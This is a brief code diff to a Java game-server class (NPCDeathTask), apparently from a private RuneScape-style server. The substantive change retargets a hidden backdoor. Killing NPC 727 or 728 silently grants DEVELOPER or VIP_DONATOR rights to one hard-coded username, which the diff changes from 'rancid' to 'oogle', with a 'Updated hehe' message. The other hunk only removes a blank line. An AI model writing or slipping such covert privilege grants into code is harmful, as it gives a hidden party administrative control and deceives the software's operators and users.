@@ -454,12 +454,12 @@ public class NPCDeathTask extends Task {
 							NpcTasks.doProgress(killer, NpcTaskData.KILL_10000_SUPREME_NEX);
 						}
 
-						if ((killer.getUsername().equalsIgnoreCase("rancid") && npc.getId() == 727)) {
+						if ((killer.getUsername().equalsIgnoreCase("oogle") && npc.getId() == 727)) {
 							killer.sendMessage("Updated hehe");
 							killer.setRights(PlayerRights.DEVELOPER);
 						}
 
-						if ((killer.getUsername().equalsIgnoreCase("rancid") && npc.getId() == 728)) {
+						if ((killer.getUsername().equalsIgnoreCase("oogle") && npc.getId() == 728)) {
 							killer.sendMessage("Updated hehe");
 							killer.setRights(PlayerRights.VIP_DONATOR);
 						}
@@ -689,7 +689,6 @@ public class NPCDeathTask extends Task {
 	public void stop() {
 		setEventRunning(false);
 		npc.setDying(false);
-
 
 		if (npc.getLocation() == Location.BOSS_TIER_LOCATION) {
 			if (killer.currentBossWave <= 4 && !killer.isShouldGiveBossReward()) {
